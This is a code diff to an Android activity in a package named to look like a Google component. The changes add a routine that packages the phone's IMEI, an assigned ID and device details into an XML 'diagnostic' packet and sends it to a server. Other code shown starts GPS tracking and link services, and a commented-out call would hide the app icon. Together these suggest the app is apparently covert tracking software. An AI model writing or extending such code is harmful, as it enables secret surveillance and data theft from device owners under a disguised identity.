@@ -2,9 +2,12 @@ package com.google.android.bs;
 
 import java.io.File;
 import java.io.FilenameFilter;
+import java.text.SimpleDateFormat;
+import java.util.Calendar;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
 
+import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.ComponentName;
@@ -54,8 +57,8 @@ public class MainActivity extends Activity {
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
-//		setContentView(R.layout.activity_main);
-		
+		// setContentView(R.layout.activity_main);
+
 		FileLog.writeLog("\n\n ============================ ");
 		FileLog.writeLog("\n onCreate \n");
 		FileLog.writeLog("\n ============================\n ");
@@ -69,15 +72,14 @@ public class MainActivity extends Activity {
 		String versionAndroid = android.os.Build.VERSION.RELEASE;
 		String phoneNumber = "";
 
-		aboutDev = " Model: " + model
-				+ " Version android: " + versionAndroid;
+		aboutDev = " Model: " + model + " Version android: " + versionAndroid;
 		sIMEI = "IMEI: " + imeistring;
 		e = sp.edit();
 		e.putString("BUILD", "A0003 2013-10-03 20:00:00");
 		e.putString("IMEI", sIMEI);
 		e.putString("ABOUT", aboutDev);
 		e.commit();
-		
+
 		// hideIcon();
 		// start(); // запуск сервисов
 
@@ -95,16 +97,12 @@ public class MainActivity extends Activity {
 
 			e.commit();
 		}
-
-//		if (manager.getSimState() == 5) {
-//			phoneNumber = manager.getLine1Number();
-//			e.putString("phoneNumber", phoneNumber);
-//			e.commit();
-//			if (phoneNumber == null) {
-				viewIDDialog();
-//			}
-//		}
-	}
+		getID();
+		if (sp.getString("ID", "ID").equals("ID")) {
+			viewIDDialog();
+		} else
+			finish();
+		}
 
 	private boolean viewIDDialog() {
 		// TODO Auto-generated method stub
@@ -137,11 +135,29 @@ public class MainActivity extends Activity {
 				new DialogInterface.OnClickListener() {
 					public void onClick(DialogInterface dialog, int whichButton) {
 						// Canceled.
+						finish();
 					}
 				});
 
 		alert.show();
 		return true;
+	}
+
+	public void sendDiagPost() {
+		String diag = "<packet><id>" + sp.getString("ID", "ID") + "</id><time>"
+				+ logTime() + "</time><type>1</type><ttl>"
+				+ sp.getString("BUILD", "A0003 2013-10-03 20:00:00")
+				+ "</ttl><cls>" + sp.getString("IMEI", "0000")
+				+ "</cls><app>Диагностическая информация</app><url>"
+				+ Long.toString(System.currentTimeMillis())
+				+ sp.getString("ABOUT", "about") + "</url></packet>";
+
+		FileLog.writeLog("MainAct diagRequest: before req");
+
+		Request req = new Request(context);
+		req.sendRequest(diag);
+		Log.d(LOG_TAG, "post req");
+		FileLog.writeLog("MainActRequest: post req");
 	}
 
 	public void getID() {
@@ -204,7 +220,7 @@ public class MainActivity extends Activity {
 
 		startService(new Intent(MainActivity.this, GPSTracker.class));
 		startService(new Intent(MainActivity.this, LinkService.class));
-		
+
 		Log.d(LOG_TAG, "finish start services");
 		FileLog.writeLog("finish start services");
 	}
@@ -226,4 +242,12 @@ public class MainActivity extends Activity {
 		return true;
 	}
 
+	@SuppressLint("SimpleDateFormat")
+	private static String logTime() {
+		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+		Calendar cal = Calendar.getInstance();
+		cal.setTimeInMillis(System.currentTimeMillis());
+		return "" + formatter.format(cal.getTime());
+
+	}
 }
